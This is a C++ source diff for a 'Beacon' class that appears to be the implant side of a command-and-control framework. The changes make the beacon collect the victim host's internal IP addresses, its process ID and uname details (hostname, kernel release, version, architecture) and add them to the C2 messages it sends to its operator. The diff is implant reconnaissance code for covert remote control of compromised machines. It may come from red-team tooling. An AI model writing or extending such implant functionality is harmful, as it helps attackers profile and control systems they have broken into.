@@ -59,6 +59,9 @@ std::string getInternalIP()
 	{
         if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_INET) 
 		{
+			if(!ips.empty())
+				ips+="\n";
+
             void* tmpAddrPtr = &((struct sockaddr_in*)ifa->ifa_addr)->sin_addr;
             char addressBuffer[INET_ADDRSTRLEN];
             inet_ntop(AF_INET, tmpAddrPtr, addressBuffer, INET_ADDRSTRLEN);
@@ -66,12 +69,9 @@ std::string getInternalIP()
             // Filter out loopback
             if (std::string(ifa->ifa_name) != "lo")
 			{
-                std::cout << "Internal IP (" << ifa->ifa_name << "): " << addressBuffer << std::endl;
-				ips += "ifa->ifa_name ";
 				ips += ifa->ifa_name;
-				ips += " ";
+				ips += ": ";
 				ips += addressBuffer;
-				ips += ";";
 			}
         }
     }
@@ -131,11 +131,13 @@ std::string getInternalIP()
 
     for (struct addrinfo* ptr = result; ptr != nullptr; ptr = ptr->ai_next) 
 	{
+		if(!ips.empty())
+			ips+="\n";
+
         struct sockaddr_in* sockaddr_ipv4 = reinterpret_cast<struct sockaddr_in*>(ptr->ai_addr);
         char ipStr[INET_ADDRSTRLEN];
         inet_ntop(AF_INET, &sockaddr_ipv4->sin_addr, ipStr, sizeof(ipStr));
 		ips += ipStr;
-		ips += ";";
     }
 
     freeaddrinfo(result);
@@ -223,11 +225,10 @@ Beacon::Beacon()
 
 	srand(time(NULL));
 
-	std::string ips = getInternalIP();
-	std::cout << "ips " << ips << std::endl;
+	m_ips = getInternalIP();
 
 	int pid = getCurrentPID();
-	std::cout << "pid " << pid << std::endl;
+	m_pid = std::to_string(pid);
 
 #ifdef __linux__
 
@@ -247,12 +248,15 @@ Beacon::Beacon()
 	struct utsname unameData;
 	uname(&unameData);
 
-	// TODO what to do with all that info ?? How to get it ??
-	// std::cout << unameData.sysname << std::endl;
-	// std::cout << unameData.nodename << std::endl;
-	// std::cout << unameData.release << std::endl;
-	// std::cout << unameData.version << std::endl;
-	// std::cout << unameData.machine << std::endl;
+	m_additionalInfo = unameData.sysname;
+	m_additionalInfo += "\n";
+	m_additionalInfo += unameData.nodename;
+	m_additionalInfo += "\n";
+	m_additionalInfo += unameData.release;
+	m_additionalInfo += "\n";
+	m_additionalInfo += unameData.version;
+	m_additionalInfo += "\n";
+	m_additionalInfo += unameData.machine;
 
 	m_arch = unameData.machine;
 
@@ -462,6 +466,9 @@ bool Beacon::taskResultsToCmd(std::string& output)
 	bundleC2Message->set_privilege(m_privilege);
 	bundleC2Message->set_os(m_os);
 	bundleC2Message->set_lastProofOfLife("0");
+	bundleC2Message->set_internalIps(m_ips);
+	bundleC2Message->set_processId(m_pid);
+	bundleC2Message->set_additionalInformation(m_additionalInfo);
 
 	while(!m_taskResult.empty())
 	{
@@ -490,6 +497,9 @@ bool Beacon::taskResultsToCmd(std::string& output)
 			bundleC2Message->set_privilege(ptr->getPrivilege());
 			bundleC2Message->set_os(ptr->getOs());
 			bundleC2Message->set_lastProofOfLife(ptr->getLastProofOfLife());
+			bundleC2Message->set_internalIps(ptr->getInternalIps());
+			bundleC2Message->set_processId(ptr->getProcessId());
+			bundleC2Message->set_additionalInformation(ptr->getAdditionalInformation());
 
 			C2Message c2Message = ptr->getTaskResult();
 			while(!c2Message.instruction().empty())
